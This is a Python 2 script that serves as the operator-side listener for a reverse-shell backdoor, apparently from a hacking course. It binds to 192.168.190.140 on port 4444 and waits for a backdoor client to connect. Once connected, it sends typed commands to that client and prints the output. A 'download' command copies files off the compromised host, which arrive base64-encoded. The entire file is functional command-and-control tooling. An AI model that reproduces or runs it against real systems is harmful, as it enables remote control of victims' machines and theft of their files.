import socket
import json
import base64


class Listener:
    # Listen incoming connection
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # In case connection drop, retrieve it
        listener.bind((ip, port))
        listener.listen(0)  # the number of connection that can be queued
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()  # accept() -> (socket object, address info)
        print("[+] Got a connection from " + str(address))

    # Send data as JSON Object
    def reliable_send(self, data):
        json_data = json.dumps(data)  # Serialize data into JSON
        self.connection.send(json_data)  # Sending data to backdoor

    def reliable_receive(self):
        json_data = ""
        # When the data is longer than 1024, concatenate the 1024 received with the rest incoming
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)  # Concatenate already received data with incoming
                return json.loads(json_data)  # Deserialize JSON data
            except ValueError:  # Make again the loop when the data to receive is more then 1024
                continue

    # Send command remotely and receives it output
    def execute_remotely(self, command):
        self.reliable_send(command)  # Sending command to backdoor
        # Reverse command exit
        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()  # Receiving output from backdoor

    # Take a remote file to write on system
    def write_file(self, path, content):
        with open(path, "wb") as file:  # Write Binary file
            file.write(base64.b64decode(content))  # Decoding content encoded in Backdoor.read_file()
            return "[+] Download successful"

    # Take input
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")  # Take command as an array
            result = self.execute_remotely(command)

            # Reverse command download
            if command[0] == "download":
                result = self.write_file(command[1], result)

            print(result)


my_listener = Listener("192.168.190.140", 4444)
my_listener.run()
